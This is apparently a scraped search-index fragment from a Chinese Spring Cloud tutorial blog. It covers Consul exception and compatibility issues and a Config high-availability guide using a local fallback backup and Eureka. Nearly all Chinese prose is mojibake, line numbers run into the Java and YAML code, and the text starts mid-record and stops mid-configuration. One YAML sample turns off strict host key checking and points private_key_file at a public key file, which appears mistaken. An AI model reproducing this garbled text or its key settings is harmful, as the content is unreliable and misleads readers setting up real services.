PollingServerListUpdaterc.s.override.consul.MyConsulServerList : ===== è‡ªå®šä¹‰æœåŠ¡å‘ç° =====c.netflix.config.ChainedDynamicProperty : Flipping property: consul-provider.ribbon.ActiveConnectionsLimit to use NEXT property: niws.loadbalancer.availabilityFilteringRule.activeConnectionsLimit = 2147483647 å¤šæ¬¡è®¿é—® http://127.0.0.1:9004/sayHello/Peterï¼Œé€šè¿‡æ¥å£è¿”å›çš„æœåŠ¡æ–¹ç«¯å£å·ï¼Œçœ‹çœ‹å®¢æˆ·ç«¯æ˜¯ä¸æ˜¯é»˜è®¤ä»¥è½®è¯¢çš„æ–¹å¼è°ƒç”¨æœåŠ¡æ–¹çš„æ¥å£ Spring Cloud Consul çš„å‘å¼‚å¸¸ä¿¡æ¯ä¸å®Œæ•´å¼€å‘è€…å¶å°”ä¼šé‡åˆ° Spring Cloud Consul æ‰“å°çš„å¼‚å¸¸å †æ ˆä¸­ï¼Œmessage ä¸º null çš„æƒ…å†µï¼Œå¯¼è‡´æ’æŸ¥é—®é¢˜å¼‚å¸¸å›°éš¾ï¼Œè¿™æ˜¯å› ä¸º Spring Cloud Consul å¯¹ consul-api è‡ªå®šä¹‰çš„ OperationException å¼‚å¸¸æ²¡æœ‰åšç‰¹æ®Šå¤„ç†å¯¼è‡´çš„ã€‚å½“ Consul çš„ HTTP å“åº”ä»£ç ä¸ºé 200 æ—¶ï¼Œconsul-api ä¼šæŠ›å‡º OperationExceptionï¼›è€Œ Spring Cloud Consul åœ¨è°ƒç”¨ consul-api æ¥å£æ—¶ï¼Œæœ‰äº›ä»£ç ä¼šç®€å•åœ°ä½¿ç”¨ Exception æ•è·å¼‚å¸¸ï¼Œç„¶åæ‰“å° Log æ—¥å¿—ï¼Œå¯¼è‡´ OperationException çš„å±æ€§ä¸¢å¤±ã€‚ä¾‹å¦‚åœ¨ ConsulCatalogWatchã€ConsulHealthIndicator ä¸­å‡ä½¿ç”¨è¿™ç§å¤„ç†æ–¹å¼ã€‚ consul-api çš„å…¼å®¹é—®é¢˜Consul åœ¨ 1.0.0 ç‰ˆæœ¬åï¼Œå°†ä¸€äº›æ¥å£ï¼ˆ/agent/check/passï¼Œ/agent/service/deregisterï¼‰ç”± GET æ–¹æ³•æ”¹æˆ PUTï¼Œè¿™ä¸ª bug åœ¨ consul-api çš„ 1.3.0 ç‰ˆæœ¬æ‰å¾—åˆ°è§£å†³ï¼Œå¯¹åº”åˆ° Spring Cloud Consul å·²ç»æ˜¯ 2.0.0.M1 ç‰ˆæœ¬äº†ã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡"},{title:"Config å…¥é—¨æ•™ç¨‹ - é«˜çº§ç¯‡",url:"/posts/8a77bec.html",text:'ä¸Šç¯‡ - Config å…¥é—¨æ•™ç¨‹ï¼ˆä¸­çº§ç¯‡ï¼‰ Config å…¥é—¨æ•™ç¨‹ - ä¸­çº§ç¯‡ å‰è¨€ç‰ˆæœ¬è¯´æ˜åœ¨ä¸‹é¢çš„çš„æ•™ç¨‹ä¸­ï¼Œä½¿ç”¨çš„ Spring Cloud ç‰ˆæœ¬æ˜¯ Finchley.RELEASEï¼Œå¯¹åº”çš„ Spring Boot ç‰ˆæœ¬æ˜¯ 2.0.3ï¼Œç‰¹åˆ«å£°æ˜é™¤å¤–ã€‚ Config é«˜å¯ç”¨å¯¹äºçº¿ä¸Šçš„ç”Ÿäº§ç¯å¢ƒï¼Œé€šå¸¸å¯¹å…¶éƒ½æ˜¯æœ‰å¾ˆé«˜çš„è¦æ±‚ï¼Œå…¶ä¸­é«˜å¯ç”¨æ˜¯ä¸å¯æˆ–ç¼ºçš„ä¸€éƒ¨åˆ†ï¼Œå¿…é¡»è¦ä¿è¯æœåŠ¡æ˜¯å¯ç”¨çŠ¶æ€ï¼Œæ‰èƒ½ä¿è¯ç³»ç»Ÿæ›´å¥½åœ°è¿è¡Œï¼Œè¿™æ˜¯ä¸šåŠ¡ç¨³å®šçš„ä¿è¯ã€‚ Config å®¢æˆ·ç«¯é«˜å¯ç”¨å¯¹äºå®¢æˆ·ç«¯çš„é«˜å¯ç”¨ï¼Œè¿™é‡Œçš„æ–¹æ¡ˆä¸»è¦è¿˜æ˜¯ç”¨ File çš„å½¢å¼ï¼Œæœ¬è´¨ä¸ â€œå®¢æˆ·ç«¯å›é€€â€ çš„æ€è·¯å¤§ä½“ä¸€è‡´ã€‚å®¢æˆ·ç«¯é«˜å¯ç”¨ä¸»è¦æ˜¯è§£å†³å½“æœåŠ¡ç«¯ä¸å¯ç”¨çš„æƒ…å†µä¸‹ï¼Œå®¢æˆ·ç«¯ä¾ç„¶å¯ä»¥æ­£å¸¸å¯åŠ¨ã€‚ä»å®¢æˆ·ç«¯çš„è§’åº¦å‡ºå‘ï¼Œä¸æ˜¯å¢åŠ é…ç½®ä¸­å¿ƒçš„é«˜å¯ç”¨æ€§ï¼Œè€Œæ˜¯é™ä½å®¢æˆ·ç«¯å¯¹é…ç½®ä¸­å¿ƒçš„ä¾èµ–ç¨‹åº¦ï¼Œä»è€Œæé«˜æ•´ä¸ªåˆ†å¸ƒå¼æ¶æ„çš„å¥å£®æ€§ã€‚å®¢æˆ·ç«¯åŠ è½½é…ç½®çš„é«˜å¯ç”¨æµç¨‹å›¾å¦‚ä¸‹ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ 1. å‡†å¤‡å·¥ä½œç”±äºä¸‹é¢çš„ Spring Cloud Config ä½¿ç”¨ Git ä½œä¸ºå­˜å‚¨æ–¹å¼ï¼Œå› æ­¤éœ€è¦æå‰åœ¨ Git è¿œç¨‹ä»“åº“ï¼ˆGithubã€Gitlabï¼‰ä¸­åˆ›å»ºå¯¹åº”çš„ä»“åº“ï¼Œç„¶åå¾€ä»“åº“é‡Œ Push ä¸‰ä¸ªé…ç½®æ–‡ä»¶ï¼Œåˆ†åˆ«æ˜¯ config-client-dev.ymlã€config-client-prod.ymlã€config-client-test.ymlï¼Œé…ç½®æ–‡ä»¶çš„å†…å®¹å¦‚ä¸‹ï¼š 123456server: port: 9001cn: springcloud: config: I am the git configuration file from dev environment 123456server: port: 9002cn: springcloud: config: I am the git configuration file from prod environment 123456server: port: 9003cn: springcloud: config: I am the git configuration file from test environment 2. åˆ›å»º Config Client HA AutoConfig å·¥ç¨‹åˆ›å»º Config Client HA AutoConfig å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼š 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-client&lt;/artifactId&gt;&lt;/dependency&gt; åˆ›å»º Config Client HA AutoConfig å·¥ç¨‹é‡Œçš„é…ç½®å±æ€§åŠ è½½ç±»ï¼š 123456789101112131415161718192021222324252627282930@Component@ConfigurationProperties(prefix = ConfigSupportProperties.CONFIG_PREFIX)public class ConfigSupportProperties { public static final String CONFIG_PREFIX = "spring.cloud.config.backup"; private final String DEFAULT_FILE_NAME = "fallback.properties"; private boolean enable = false; private String fallbackLocation; public boolean isEnable() { return enable; } public void setEnable(boolean enable) { this.enable = enable; } public String getFallbackLocation() { return fallbackLocation; } public void setFallbackLocation(String fallbackLocation) { // å¦‚æœåªæ˜¯å¡«å†™è·¯å¾„ï¼Œ å°±æ·»åŠ ä¸Šä¸€ä¸ªé»˜è®¤çš„æ–‡ä»¶å if (fallbackLocation.indexOf(".") == -1) { this.fallbackLocation = fallbackLocation + DEFAULT_FILE_NAME; return; } this.fallbackLocation = fallbackLocation; }} åˆ›å»º Config Client HA AutoConfig å·¥ç¨‹é‡Œçš„è‡ªåŠ¨é…ç½®ç±»ï¼Œè¯¥ç±»ä¸»è¦çš„ä½œç”¨æ˜¯åˆ¤æ–­ Config Server ç«¯çš„é…ç½®ä¿¡æ¯æ˜¯å¦å¯ç”¨ï¼Œå¦‚æœä¸èƒ½ç”¨å°†è¯»å–åŠ è½½æœ¬åœ°å¤‡ä»½é…ç½®æ–‡ä»¶è¿›è¡Œå¯åŠ¨ã€‚éœ€è¦æ³¨æ„çš„æ˜¯å¯åŠ¨é¡ºåºçš„è®¾ç½®ï¼Œè¿™æ˜¯å› ä¸º Spring Cloud ä½¿ç”¨çš„ PropertySourceBootstrapConfiguration å¯åŠ¨é¡ºåºä¸º private int order = -2147483638ï¼Œorder çš„å€¼è¶Šå°è¶Šå…ˆåŠ è½½ï¼Œæ‰€ä»¥ä¸‹è¿°çš„ orderNum åªè¦åŠ ä¸Šä¸€ä¸ªæ•´æ•°æ¯”å…¶å¤§å³å¯ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185@Configuration@EnableConfigurationProperties(ConfigSupportProperties.class)public class ConfigSupportConfiguration implements ApplicationContextInitializer&lt;ConfigurableApplicationContext&gt;, Ordered { private final Logger LOGGER = LoggerFactory.getLogger(ConfigSupportConfiguration.class); private final Integer orderNum = Ordered.HIGHEST_PRECEDENCE + 11; @Autowired(required = false) private List&lt;PropertySourceLocator&gt; propertySourceLocators = Collections.EMPTY_LIST; @Autowired private ConfigSupportProperties configSupportProperties; @Override public void initialize(ConfigurableApplicationContext configurableApplicationContext) { if (!isHasCloudConfigLocator(this.propertySourceLocators)) { LOGGER.info("æœªå¯ç”¨Config Serverç®¡ç†é…ç½®"); return; } LOGGER.info("æ£€æŸ¥Config Serviceé…ç½®èµ„æº"); ConfigurableEnvironment environment = configurableApplicationContext.getEnvironment(); MutablePropertySources propertySources = environment.getPropertySources(); LOGGER.info("åŠ è½½PropertySourcesæºï¼š" + propertySources.size() + "ä¸ª"); if (!configSupportProperties.isEnable()) { LOGGER.warn("æœªå¯ç”¨é…ç½®å¤‡ä»½åŠŸèƒ½ï¼Œå¯ä½¿ç”¨{}.enableæ‰“å¼€", ConfigSupportProperties.CONFIG_PREFIX); return; } if (isCloudConfigLoaded(propertySources)) { PropertySource cloudConfigSource = getLoadedCloudPropertySource(propertySources); LOGGER.info("æˆåŠŸè·å–ConfigServiceé…ç½®èµ„æº"); Map&lt;String, Object&gt; backupPropertyMap = makeBackupPropertyMap(cloudConfigSource); doBackup(backupPropertyMap, configSupportProperties.getFallbackLocation()); LOGGER.info("æˆåŠŸå¤‡ä»½ConfigServiceé…ç½®èµ„æº"); } else { LOGGER.error("è·å–ConfigServiceé…ç½®èµ„æºå¤±è´¥"); Properties backupProperty = loadBackupProperty(configSupportProperties.getFallbackLocation()); if (backupProperty != null) { HashMap backupSourceMap = new HashMap&lt;&gt;(backupProperty); PropertySource backupSource = new MapPropertySource("backupSource", backupSourceMap); propertySources.addFirst(backupSource); LOGGER.warn("ä½¿ç”¨å¤‡ä»½çš„é…ç½®å¯åŠ¨ï¼š{}", configSupportProperties.getFallbackLocation()); } } } @Override public int getOrder() { return orderNum; } /** * æ˜¯å¦å¯ç”¨äº†Spring Cloud Configè·å–é…ç½®èµ„æº * * @param propertySourceLocators * @return */ private boolean isHasCloudConfigLocator(List&lt;PropertySourceLocator&gt; propertySourceLocators) { for (PropertySourceLocator sourceLocator : propertySourceLocators) { if (sourceLocator instanceof ConfigServicePropertySourceLocator) { return true; } } return false; } /** * æ˜¯å¦å¯ç”¨Cloud Config * * @param propertySources * @return */ private boolean isCloudConfigLoaded(MutablePropertySources propertySources) { if (getLoadedCloudPropertySource(propertySources) == null) { return false; } return true; } /** * è·å–åŠ è½½çš„Cloud Configé…ç½®é¡¹ * * @param propertySources * @return */ private PropertySource getLoadedCloudPropertySource(MutablePropertySources propertySources) { if (!propertySources.contains(PropertySourceBootstrapConfiguration.BOOTSTRAP_PROPERTY_SOURCE_NAME)) { return null; } PropertySource propertySource = propertySources.get(PropertySourceBootstrapConfiguration.BOOTSTRAP_PROPERTY_SOURCE_NAME); if (propertySource instanceof CompositePropertySource) { for (PropertySource&lt;?&gt; source : ((CompositePropertySource) propertySource).getPropertySources()) { if (source.getName().equals("configService")) { return source; } } } return null; } /** * ç”Ÿæˆå¤‡ä»½çš„é…ç½®æ•°æ® * * @param propertySource * @return */ private Map&lt;String, Object&gt; makeBackupPropertyMap(PropertySource propertySource) { Map&lt;String, Object&gt; backupSourceMap = new HashMap&lt;&gt;(); if (propertySource instanceof CompositePropertySource) { CompositePropertySource composite = (CompositePropertySource) propertySource; for (PropertySource&lt;?&gt; source : composite.getPropertySources()) { if (source instanceof MapPropertySource) { MapPropertySource mapSource = (MapPropertySource) source; for (String propertyName : mapSource.getPropertyNames()) { // å‰é¢çš„é…ç½®è¦†ç›–åé¢çš„é…ç½® if (!backupSourceMap.containsKey(propertyName)) { backupSourceMap.put(propertyName, mapSource.getProperty(propertyName)); } } } } } return backupSourceMap; } /** * ç”Ÿæˆå¤‡ä»½æ–‡ä»¶ * * @param backupPropertyMap * @param filePath */ private void doBackup(Map&lt;String, Object&gt; backupPropertyMap, String filePath) { FileSystemResource fileSystemResource = new FileSystemResource(filePath); File backupFile = fileSystemResource.getFile(); try { if (!backupFile.exists()) { backupFile.createNewFile(); } if (!backupFile.canWrite()) { LOGGER.error("æ— æ³•è¯»å†™æ–‡ä»¶ï¼š{}", fileSystemResource.getPath()); } Properties properties = new Properties(); Iterator&lt;String&gt; keyIterator = backupPropertyMap.keySet().iterator(); while (keyIterator.hasNext()) { String key = keyIterator.next(); properties.setProperty(key, String.valueOf(backupPropertyMap.get(key))); } FileOutputStream fos = new FileOutputStream(fileSystemResource.getFile()); properties.store(fos, "Backup Cloud Config"); } catch (IOException e) { LOGGER.error("æ–‡ä»¶æ“ä½œå¤±è´¥ï¼š{}", fileSystemResource.getPath()); e.printStackTrace(); } } /** * åŠ è½½æœ¬åœ°æ–‡ä»¶ * * @param filePath * @return */ private Properties loadBackupProperty(String filePath) { PropertiesFactoryBean propertiesFactory = new PropertiesFactoryBean(); Properties props = new Properties(); try { FileSystemResource fileSystemResource = new FileSystemResource(filePath); propertiesFactory.setLocation(fileSystemResource); propertiesFactory.afterPropertiesSet(); props = propertiesFactory.getObject(); } catch (IOException e) { e.printStackTrace(); return null; } return props; }} åˆ›å»º Config Client HA AutoConfig å·¥ç¨‹é‡Œ /src/main/resources/META-INF/spring.factories é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ ä¸Šé¢çš„è‡ªåŠ¨é…ç½®ç±»ï¼š 12org.springframework.cloud.bootstrap.BootstrapConfiguration=\\com.springcloud.study.config.ConfigSupportConfiguration 3. åˆ›å»º Config Client å·¥ç¨‹åˆ›å»º Config Client çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œéœ€è¦å¼•å…¥ä¸Šé¢çš„ config-client-ha-autoconfigï¼š 123456789&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.springcloud.study&lt;/groupId&gt; &lt;artifactId&gt;config-client-ha-autoconfig&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/dependency&gt; åˆ›å»º Config Client çš„ä¸»å¯åŠ¨ç±»ï¼š 1234567@SpringBootApplicationpublic class ConfigClientApplication { public static void main(String[] args) { SpringApplication.run(ConfigClientApplication.class, args); }} ä¸ºäº†æ›´å¥½åœ°è§‚å¯Ÿæ‹‰å–åˆ°çš„ Git ä¸Šé¢çš„é…ç½®ï¼Œè¿™é‡Œéœ€è¦åˆ›å»ºä¸€ä¸ª Controller ç”¨äºè®¿é—®è¿”å›é…ç½®ä¿¡æ¯ï¼ŒåŒæ—¶è¿˜éœ€è¦åˆ›å»ºä¸€ä¸ªå®ä½“ï¼Œç”¨äºæ³¨å…¥è¿œç¨‹é…ç½®ä¸Šçš„ä¿¡æ¯ï¼š 1234567891011121314@Component@ConfigurationProperties(prefix = "cn.springcloud")public class ConfigProperties { private String config; public String getConfig() { return config; } public void setConfig(String config) { this.config = config; }} 1234567891011@RestControllerpublic class ConfigController { @Autowired public ConfigProperties configProperties; @GetMapping("/getConfigInfo") public String getConfigInfo() { return configProperties.getConfig(); }} æ·»åŠ  Config Client éœ€è¦çš„ application.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹ä¸­ï¼š 123spring: application: name: config-client æ·»åŠ  Config Client éœ€è¦çš„ bootstrap.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹ä¸­ï¼Œenable è¡¨ç¤ºæ˜¯å¦å¯åŠ¨åŠ è½½è¿œç¨‹é…ç½®ä¿¡æ¯è¿›è¡Œæœ¬åœ°å¤‡ä»½ï¼ŒfallbackLocation è¡¨ç¤ºæœ¬åœ°å¤‡ä»½çš„è·¯å¾„ï¼Œä¹Ÿå¯ä»¥æ˜¯è·¯å¾„åŠ ä¸Šæ–‡ä»¶åï¼š 12345678910spring: cloud: config: name: config-client #éœ€è¦ä»è¿œç¨‹Gitä»“åº“è¯»å–çš„é…ç½®æ–‡ä»¶çš„åç§°ï¼Œæ³¨æ„æ²¡æœ‰"yml"æ–‡ä»¶åç¼€ï¼Œå¯ä»¥å†™å¤šä¸ªï¼Œé€šè¿‡é€—å·éš”å¼€ profile: dev #æœ¬æ¬¡è®¿é—®çš„é…ç½®é¡¹ label: master #Gitåˆ†æ”¯çš„åç§° uri: http://127.0.0.1:8001 #Config Serverçš„åœ°å€ backup: enable: true fallbackLocation: /tmp/config/config-client-dev/fallback.properties #å¤‡ä»½é…ç½®æ–‡ä»¶çš„è·¯å¾„ 4. åˆ›å»º Config Server å·¥ç¨‹åˆ›å»º Config Server çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œéœ€è¦å¼•å…¥ spring-cloud-config-server 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-server&lt;/artifactId&gt;&lt;/dependency&gt; åˆ›å»º Config Server çš„ä¸»å¯åŠ¨ç±»ï¼Œå¢åŠ  @EnableConfigServer æ³¨è§£ï¼š 12345678@EnableConfigServer@SpringBootApplicationpublic class ConfigServerApplication { public static void main(String[] args) { SpringApplication.run(ConfigServerApplication.class, args); }} æ·»åŠ  Config Server éœ€è¦çš„ application.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹ä¸­ï¼š 123456789101112131415server: port: 8001spring: application: name: config-server cloud: config: server: git: uri: git@github.com:xxxxx/spring-cloud-config-study-repo.git search-paths: spring-cloud-config-study-repo/ strictHostKeyChecking: false private_key_file: /root/.ssh/id_rsa.pub label: master 5. æµ‹è¯•ç»“æœ ä¾æ¬¡å¯åŠ¨ config-serverã€config-client åº”ç”¨ è®¿é—® http://127.0.0.1:9001/getConfigInfo åè§‚å¯Ÿè¿”å›çš„é…ç½®ä¿¡æ¯ï¼Œä¸æ­¤åŒæ—¶æŸ¥çœ‹æ˜¯å¦åœ¨ç›®å½• /tmp/config/config-client-dev/ ä¸‹æˆåŠŸåˆ›å»ºäº†å¤‡ä»½æ–‡ä»¶ fallback.properties å…³é—­ config-serverã€config-client åº”ç”¨ï¼Œç„¶åå•ç‹¬å¯åŠ¨ config-client åº”ç”¨ï¼›è§‚å¯Ÿåœ¨ä¸å¯åŠ¨ config-server çš„æƒ…å†µä¸‹ï¼Œconfig-client åº”ç”¨æ˜¯å¦èƒ½æ­£å¸¸å¯åŠ¨ è‹¥ config-client åº”ç”¨å•ç‹¬å¯åŠ¨æˆåŠŸï¼Œconfig-client åº”ç”¨ä¼šå…ˆå°è¯•å»è¿æ¥ config-serverï¼Œå½“è¿æ¥å¤±è´¥åï¼Œä¼šåŠ è½½æœ¬åœ°çš„å¤‡ä»½æ–‡ä»¶ï¼Œæ­¤æ—¶æ§åˆ¶å°è¾“å‡ºçš„æ—¥å¿—ä¿¡æ¯å¦‚ä¸‹ï¼š 1234567c.c.c.ConfigServicePropertySourceLocator : Fetching config from server at : http://127.0.0.1:8001c.c.c.ConfigServicePropertySourceLocator : Connect Timeout Exception on Url - http://127.0.0.1:8001. Will be trying the next url if availablec.c.c.ConfigServicePropertySourceLocator : Could not locate PropertySource: I/O error on GET request for "http://127.0.0.1:8001/config-client/dev/master": æ‹’ç»è¿æ¥; nested exception is java.net.ConnectException: æ‹’ç»è¿æ¥c.s.s.config.ConfigSupportConfiguration : æ£€æŸ¥Config Serviceé…ç½®èµ„æºc.s.s.config.ConfigSupportConfiguration : åŠ è½½PropertySourcesæºï¼š10ä¸ªc.s.s.config.ConfigSupportConfiguration : è·å–ConfigServiceé…ç½®èµ„æºå¤±è´¥c.s.s.config.ConfigSupportConfiguration : ä½¿ç”¨å¤‡ä»½çš„é…ç½®å¯åŠ¨ï¼š/tmp/config/config-client-dev/fallback.properties Config æœåŠ¡ç«¯é«˜å¯ç”¨Config Server ä¸€æ ·éœ€è¦åœ¨ç”Ÿæˆç¯å¢ƒä¸‹ä¿è¯é«˜å¯ç”¨çš„ï¼Œè¿™é‡Œå°†é€šè¿‡ç»“åˆ Eureka æ³¨å†Œä¸­å¿ƒçš„æ–¹å¼æ­å»º Config Server çš„é«˜å¯ç”¨ï¼Œå³é€šè¿‡ Ribbon çš„å®¢æˆ·ç«¯è´Ÿè½½å‡è¡¡é€‰æ‹©ä¸€ä¸ª Config Server è¿›è¡Œè¿æ¥æ¥è·å–é…ç½®ä¿¡æ¯ï¼Œå…·ä½“çš„æµç¨‹å¦‚ä¸‹ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚å¯¹äº Eureka çš„é«˜å¯ç”¨è¿™é‡Œä¹Ÿä¸è¿›è¡Œè¯¦è§£ï¼Œè¯¦ç»†å…³äº Eureka çš„é«˜å¯ç”¨å¯å‚è€ƒ Eureka é›†ç¾¤é…ç½®ã€‚ 1. å‡†å¤‡è¯´æ˜æœ¬ç¤ºä¾‹ç”¨åˆ°ä¸Šé¢çš„ â€œå®¢æˆ·ç«¯é«˜å¯ç”¨â€ ç¤ºä¾‹ä¸­ Git ä»“åº“é‡Œçš„é…ç½®æ–‡ä»¶ï¼ŒåŒ…æ‹¬ config-client-dev.ymlã€config-client-prod.ymlã€config-client-test.ymlã€‚ 2. åˆ›å»º Eureka Server å·¥ç¨‹åˆ›å»º Eureka Server çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œå¼•å…¥ spring-cloud-starter-netflix-eureka-server 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt;&lt;/dependency&gt; åˆ›å»º Eureka Server çš„å¯åŠ¨ä¸»ç±»ï¼Œè¿™é‡Œæ·»åŠ ç›¸åº”æ³¨è§£ï¼Œä½œä¸ºç¨‹åºçš„å…¥å£ï¼š 12345678@EnableEurekaServer@SpringBootApplicationpublic class EurekaServerApplication { public static void main(String[] args) { SpringApplication.run(EurekaServerApplication.class, args); }} æ·»åŠ  Eureka Server éœ€è¦çš„ application.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹çš„ src/main/resources ç›®å½•ä¸‹ï¼š 1234567891011server: port: 7001eureka: instance: hostname: localhost #EurekaæœåŠ¡ç«¯çš„å®ä¾‹åç§° client: register-with-eureka: false #falseè¡¨ç¤ºä¸å‘æ³¨å†Œä¸­å¿ƒæ³¨å†Œè‡ªå·± fetch-registry: false #falseè¡¨ç¤ºè‡ªå·±å°±æ˜¯æ³¨å†Œä¸­å¿ƒï¼ŒèŒè´£å°±æ˜¯ç»´æŠ¤æœåŠ¡å®ä¾‹ï¼Œå¹¶ä¸éœ€è¦å»æ£€ç´¢æœåŠ¡ service-url: defaultZone: http://${eureka.instance.hostname}:${server.port}/eureka/ 3. åˆ›å»º Config Server å·¥ç¨‹åˆ›å»º Config Server çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œç”±äº Config Sever éœ€è¦æ³¨å†Œåˆ° Eureka Serverï¼Œæ‰€ä»¥éœ€è¦å¦å¤–æ·»åŠ  Eureka Client çš„ä¾èµ–ï¼š 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-server&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt; åˆ›å»º Config Server çš„ä¸»å¯åŠ¨ç±»ï¼Œå¢åŠ  @EnableConfigServerã€@EnableDiscoveryClient æ³¨è§£ï¼š 123456789@EnableConfigServer@EnableDiscoveryClient@SpringBootApplicationpublic class ConfigServerApplication { public static void main(String[] args) { SpringApplication.run(ConfigServerApplication.class, args); }} æ·»åŠ  Config Server éœ€è¦çš„ application.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹ä¸­ï¼š 1234567891011121314151617181920212223server: port: 8001spring: application: name: config-server cloud: config: server: git: uri: git@github.com:xxxxx/spring-cloud-config-study-repo.git search-paths: spring-cloud-config-study-repo/ strictHostKeyChecking: false private_key_file: /root/.ssh/id_rsa.pub label: mastereureka: client: service-url: defaultZone: http://localhost:7001/eureka instance: instance-id: ${spring.application.name}-${server.port} #è‡ªå®šä¹‰æœåŠ¡åç§° prefer-ip-address: true #å°†IPæ³¨å†Œåˆ°Eureka Serverä¸Šï¼Œè‹¥ä¸é…ç½®é»˜è®¤ä½¿ç”¨æœºå™¨çš„ä¸»æœºå 4. åˆ›å»º Config Client å·¥ç¨‹åˆ›å»º Config Client çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œç”±äº Config Client éœ€è¦æ³¨å†Œåˆ° Eureka Serverï¼Œæ‰€ä»¥éœ€è¦å¦å¤–æ·»åŠ  Eureka Client çš„ä¾èµ–ï¼š 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt; åˆ›å»º Config Client çš„ä¸»å¯åŠ¨ç±»ï¼Œå¢åŠ  @EnableDiscoveryClient æ³¨è§£ï¼š 123456789@EnableDiscoveryClient@SpringBootApplicationpublic class ConfigClientApplication { public static void main(String[] args) { SpringApplication.run(ConfigClientApplication.class, args); }} ä¸ºäº†æ›´å¥½åœ°è§‚å¯Ÿæ‹‰å–åˆ°çš„ Git ä¸Šé¢çš„é…ç½®ï¼Œè¿™é‡Œéœ€è¦åˆ›å»ºä¸€ä¸ª Controller ç”¨äºè®¿é—®è¿”å›é…ç½®ä¿¡æ¯ï¼ŒåŒæ—¶è¿˜éœ€è¦åˆ›å»ºä¸€ä¸ªå®ä½“ï¼Œç”¨äºæ³¨å…¥è¿œç¨‹é…ç½®ä¸Šçš„ä¿¡æ¯ï¼š 1234567891011121314@Component@ConfigurationProperties(prefix = "cn.springcloud")public class ConfigProperties { private String config; public String getConfig() { return config; } public void setConfig(String config) { this.config = config; }} 1234567891011@RestControllerpublic class ConfigController { @Autowired public ConfigProperties configProperties; @GetMapping("/getConfigInfo") public String getConfigInfo() { return configProperties.getConfig(); }} æ·»åŠ  Config Client éœ€è¦çš„ application.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹ä¸­ï¼š 123spring: application: name: config-client æ·»åŠ  Config Client éœ€è¦çš„ bootstrap.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹ä¸­ï¼Œè¿™é‡Œä¸å†ä½¿ç”¨ spring.cloud.config.uri å‚æ•°ç›´æ¥æŒ‡å‘ Config Server ç«¯çš„è¿æ¥åœ°å€ï¼Œè€Œæ˜¯å¢åŠ äº†ä¸‹è¿°ä¸‰ä¸ªå‚æ•°ï¼š spring.cloud.config.discovery.enabledï¼šå¼€å¯ Config Client çš„æœåŠ¡å‘ç°æ”¯æŒ spring.cloud.config.discovery.service-idï¼šæŒ‡å®š Config Server ç«¯çš„ serviceIdï¼Œä¹Ÿå°±æ˜¯ Config Server ç«¯çš„ spring.application.name å‚æ•°å€¼ eureka.client.service-url.defaultZoneï¼š æŒ‡å‘ Eureka æ³¨å†Œä¸­å¿ƒçš„åœ°å€ 1234567891011121314151617spring: cloud: config: name: config-client 